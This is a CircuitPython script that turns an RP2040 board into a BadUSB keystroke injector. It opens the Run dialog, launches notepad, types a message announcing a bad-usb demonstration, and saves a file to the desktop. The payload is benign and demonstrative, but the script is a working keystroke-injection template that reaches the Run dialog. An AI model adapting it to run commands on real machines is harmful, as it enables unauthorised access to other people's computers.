import usb_hid
from adafruit_hid.consumer_control import ConsumerControl
from adafruit_hid.keyboard import Keyboard
from time import sleep

# Adjust depending of the targetted keyboard layout
import keyboard_layout_win_us as keyboard_layout
from keycode_win_us import Keycode

# Designed for Waveshare RP2040-One
# Should also work on any RP2040 or RP2350 board

keyboard = Keyboard(usb_hid.devices)
layout = keyboard_layout.KeyboardLayout(keyboard)

keyboard.send(Keycode.WINDOWS, Keycode.D)
sleep(0.1)
keyboard.send(Keycode.WINDOWS, Keycode.R)
sleep(0.2)
layout.write("notepad")
keyboard.send(Keycode.ENTER)
sleep(0.5)
keyboard.send(Keycode.ENTER)
layout.write("Hello,")
keyboard.send(Keycode.ENTER)
keyboard.send(Keycode.ENTER)
layout.write("This is a demonstration of a bad-usb attack.")
keyboard.send(Keycode.ENTER)
layout.write("I have launched a program on your computer,")
keyboard.send(Keycode.ENTER)
layout.write("and now I am writing this file to your desktop.")
keyboard.send(Keycode.ENTER)
keyboard.send(Keycode.ENTER)
keyboard.send(Keycode.CONTROL, Keycode.S)
sleep(0.5)
layout.write("%userprofile%\\Desktop")
sleep(0.3)
keyboard.send(Keycode.ENTER)
sleep(0.3)
layout.write("DELETE-ME.txt")
sleep(0.3)
keyboard.send(Keycode.ENTER)